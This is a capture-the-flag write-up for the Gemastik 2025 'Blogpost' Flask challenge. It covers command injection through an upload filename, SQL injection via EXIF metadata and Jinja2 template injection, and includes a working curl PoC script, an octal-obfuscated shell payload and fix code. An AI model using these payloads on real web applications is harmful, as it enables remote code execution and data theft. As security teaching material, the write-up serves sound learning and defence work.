# Gemastik 2025 Final - Blogpost Challenge Writeup

## Challenge Information

- **Challenge Name**: Blogpost
- **Category**: Web Exploitation
- **Difficulty**: Medium
- **Points**: TBD
- **Flag Format**: `GEMASTIK{<64-hex-chars>}`

## Description

A Flask-based blog application where users can create posts with images. The goal is to retrieve the flag stored in `/app/flag.txt`, which is only displayed to admin users on the profile page.

## Solution Overview

This challenge has **TWO** viable exploitation paths:

1. **Command Injection** (Primary) - Inject shell commands through the image upload filename field to copy the flag to an accessible location
2. **SQL Injection** (Alternative) - Inject SQL through EXIF metadata to escalate privileges to admin and view the flag on `/profile`

Both paths work! The command injection is easier and more reliable.

### Key Vulnerability

```python
# app.py, lines 126-135
original_filename = file.filename  # User-controlled, no sanitization
save_path = os.path.join(app.config['UPLOAD_FOLDER'], original_filename)
cmd = f"exiftool {save_path}"  # Direct injection into shell command
os.system(full_cmd)  # Executes with shell
```

## Quick Solution

```bash
# Run the provided exploit script
python3 dapur.py <target-ip> <port>

# Example:
python3 dapur.py 192.168.1.100 10000

# Output:
GEMASTIK{a1b2c3d4e5f6789012345678901234567890abcdefabcdefabcdefabcdef1234}
```

## Exploitation Steps (Path 1: Command Injection)

This is the primary/easier method demonstrated in `dapur.py`.

### Step 1: Setup

1. Register a new user account
2. Login to get session cookie

### Step 2: Create Target

1. Upload a legitimate PNG image
2. Server hashes it with SHA256 and renames to `<hash>.png`
3. Parse the response to get the target hash

### Step 3: Command Injection

1. Upload another image with malicious filename:
   ```
   x.png; cp $(printf '\057app\057flag.txt') $(printf '\057app\057uploads\057<hash>.png') #.png
   ```
2. The semicolon breaks out of the exiftool command
3. `cp` copies the flag to overwrite our first image
4. `#` comments out the rest to avoid syntax errors

### Step 4: Retrieve Flag

1. Fetch `/uploads/<hash>.png`
2. Authorization passes (it's our own file)
3. File now contains the flag instead of image data

## Technical Details

### Why It Works

1. **No filename sanitization**: `file.filename` is used directly
2. **Shell execution**: `os.system()` spawns `/bin/sh -c`
3. **Shell metacharacters**: `;` allows command chaining
4. **Path obfuscation**: `printf '\057'` outputs `/` (bypasses filters)
5. **Authorization bypass**: We access our own uploaded file

### Attack Flow

```
┌─────────┐    1. Upload seed.png
│ Attacker│───────────────────────────┐
└─────────┘                           v
                              ┌───────────────┐
┌─────────┐    2. Get hash   │ Flask Server  │
│ Attacker│◄──────────────────┤ (vulnerable)  │
└─────────┘    a1b2c3...png   └───────────────┘
                                      │
┌─────────┐    3. Inject cmd         │
│ Attacker│───────────────────────────┤
└─────────┘    x.png; cp flag; #.png  │
                                      │
                              ┌───────v───────┐
                              │ Shell Exec    │
                              │ cp /app/flag  │
                              │    /app/      │
                              │    uploads/   │
                              │    a1b2c3.png │
                              └───────────────┘
                                      │
┌─────────┐    4. Fetch file         v
│ Attacker│───────────────────────────┐
└─────────┘                           │
                              ┌───────v───────┐
┌─────────┐    5. Flag!      │ File System   │
│ Attacker│◄──────────────────┤ a1b2c3.png    │
└─────────┘    GEMASTIK{...}  │ = flag.txt    │
                              └───────────────┘
```

## Vulnerabilities Found

### 1. 🔴 Command Injection (CRITICAL) - Main Exploit Path

**Location**: `app.py:132`

**Code**:

```python
cmd = f"exiftool {save_path}"
os.system(full_cmd)
```

**Impact**: Remote Code Execution (RCE)

**CVSS**: 9.8 (Critical)

### 2. 🟠 SQL Injection (HIGH)

**Location**: `app.py:193-194`

**Code**:

```python
metadata_insert = f"UPDATE posts SET metadata = '{metadata_text}' WHERE id = {post_id};"
db.executescript(metadata_insert)
```

**Impact**: Data manipulation, potential data exfiltration

**CVSS**: 8.6 (High)

### 3. 🟡 Server-Side Template Injection (MEDIUM)

**Location**: `app.py:249, 257`

**Note**: For an alternative exploitation path using the SQL injection to become admin, see **[PRIVILEGE_ESCALATION.md](PRIVILEGE_ESCALATION.md)**!

**Code**:

```python
profile_source = profile_template.replace("{{ user.username }}", username)
return render_template_string(profile_source, user=user, flag=flag_content)
```

**Impact**: Potential RCE through Jinja2 injection

**CVSS**: 7.5 (High)

## Files Analyzed

```
blogpost/
├── app.py              # Main application (vulnerabilities here)
├── dapur.py            # Exploit script (working solution)
├── init_db.sql         # Database schema
├── requirements.txt    # Python dependencies
├── Dockerfile          # Container configuration
├── entrypoint.sh       # Flag generation script
├── docker-compose.yml  # Container orchestration
└── templates/
    ├── layout.html
    ├── index.html
    ├── login.html
    ├── register.html
    ├── create_post.html
    ├── view_post.html
    └── profile.html
```

## Proof of Concept

### Manual Exploitation

```bash
#!/bin/bash

TARGET="http://192.168.1.100:10000"
USER="pwner"
PASS="pwner123"

# 1. Register
curl -X POST "$TARGET/register" -d "username=$USER&password=$PASS"

# 2. Login
curl -X POST "$TARGET/login" -d "username=$USER&password=$PASS" -c cookies.txt

# 3. Upload seed image
printf '\x89PNG\r\n\x1a\n\x00\x00\x00\rIHDR' > seed.png
curl -X POST "$TARGET/create" -b cookies.txt \
  -F "title=test" -F "content=test" -F "image=@seed.png"

# 4. Get hash
HASH=$(curl "$TARGET/" -b cookies.txt | grep -oP '/uploads/\K[0-9a-f]{64}\.png' | head -1)
echo "Target hash: $HASH"

# 5. Inject command
PAYLOAD="x.png; cp \$(printf '\\\\057app\\\\057flag.txt') \$(printf '\\\\057app\\\\057uploads\\\\057$HASH') #.png"
printf '\x89PNG\r\n\x1a\n\x00\x00\x00\rIHDR' > pwn.png
curl -X POST "$TARGET/create" -b cookies.txt \
  -F "title=pwn" -F "content=pwn" -F "image=@pwn.png;filename=$PAYLOAD"

# 6. Retrieve flag
sleep 1
curl "$TARGET/uploads/$HASH" -b cookies.txt
```

## Remediation

### Fix Command Injection

```python
# BEFORE (vulnerable)
cmd = f"exiftool {save_path}"
os.system(full_cmd)

# AFTER (secure)
import subprocess
result = subprocess.run(['exiftool', save_path],
                       capture_output=True,
                       text=True,
                       shell=False)  # Never use shell=True
metadata_text = result.stdout
```

### Fix SQL Injection

```python
# BEFORE (vulnerable)
metadata_insert = f"UPDATE posts SET metadata = '{metadata_text}' WHERE id = {post_id};"
db.executescript(metadata_insert)

# AFTER (secure)
db.execute("UPDATE posts SET metadata = ? WHERE id = ?",
           (metadata_text, post_id))
db.commit()
```

### Fix SSTI

```python
# BEFORE (vulnerable)
profile_source = profile_template.replace("{{ user.username }}", username)
return render_template_string(profile_source, user=user, flag=flag_content)

# AFTER (secure)
return render_template("profile.html", user=user, flag=flag_content)
# Let Jinja2 handle escaping automatically
```

### Additional Security Measures

1. **Use secure_filename()**:

   ```python
   from werkzeug.utils import secure_filename
   safe_name = secure_filename(file.filename)
   ```

2. **Validate file contents** (magic bytes):

   ```python
   import imghdr
   if imghdr.what(file) not in ['png', 'jpeg', 'gif', 'bmp']:
       abort(400)
   ```

3. **Run with least privileges**:

   ```dockerfile
   RUN useradd -m -u 1000 appuser
   USER appuser
   ```

4. **Add security headers**:
   ```python
   @app.after_request
   def set_security_headers(response):
       response.headers['X-Content-Type-Options'] = 'nosniff'
       response.headers['X-Frame-Options'] = 'DENY'
       return response
   ```

## Learning Points

### For Attackers

- Always test file upload fields for command injection
- Filenames are often overlooked as input vectors
- Shell metacharacters: `; | & $ ( ) < > #`
- Obfuscation techniques: octal `\057`, hex `\x2f`, printf
- Race conditions: retry multiple times for success

### For Defenders

- **Never** pass user input to shell commands
- Use `subprocess.run()` with array (no shell)
- Always sanitize filenames with `secure_filename()`
- Use parameterized queries for SQL
- Let templating engines handle escaping
- Validate file contents, not just extensions
- Implement defense in depth

## Related Challenges

Similar vulnerabilities found in:

- **OWASP Juice Shop**: File upload command injection
- **HackTheBox**: Inclusion, Poison
- **PicoCTF**: Cookies, File Types

## Tools Used

- `curl` - HTTP requests
- `Python requests` - HTTP client library
- `grep/regex` - Parse HTML responses
- `printf` - Generate binary data
- `exiftool` - EXIF metadata (target binary)

## References

- [OWASP Command Injection](https://owasp.org/www-community/attacks/Command_Injection)
- [CWE-78: OS Command Injection](https://cwe.mitre.org/data/definitions/78.html)
- [Flask Security Considerations](https://flask.palletsprojects.com/en/2.3.x/security/)
- [Python subprocess Security](https://docs.python.org/3/library/subprocess.html#security-considerations)

## Additional Documentation

- **[VULNERABILITY_ANALYSIS.md](VULNERABILITY_ANALYSIS.md)** - Detailed vulnerability breakdown
- **[ATTACK_FLOW.md](ATTACK_FLOW.md)** - Visual attack flow diagram with ASCII art
- **[QUICK_REFERENCE.md](QUICK_REFERENCE.md)** - Quick commands and payloads
- **[PRIVILEGE_ESCALATION.md](PRIVILEGE_ESCALATION.md)** - Alternative path: SQL injection to become admin

## Flag

```
GEMASTIK{<64-character-hex-SHA256>}
```

The flag is randomly generated on container startup using:

```bash
FLAG_SHA=$(head -c 64 /dev/urandom | sha256sum | awk '{print $1}')
FLAG="GEMASTIK{${FLAG_SHA}}"
```

## Conclusion

This challenge demonstrates a common real-world vulnerability: **command injection through filename manipulation**. Many developers forget that filenames are user-controlled input and can contain malicious data. The key lesson is to:

1. **Never trust user input** - even filenames
2. **Never use shell commands** with user data
3. **Always use secure alternatives** like `subprocess.run()` without shell
4. **Implement multiple layers** of defense

---

**Challenge Rating**: ⭐⭐⭐☆☆ (3/5)  
**Exploit Difficulty**: Medium  
**Real-World Relevance**: High

The vulnerability is realistic and has been found in production applications. Understanding this attack pattern is crucial for both security researchers and developers.
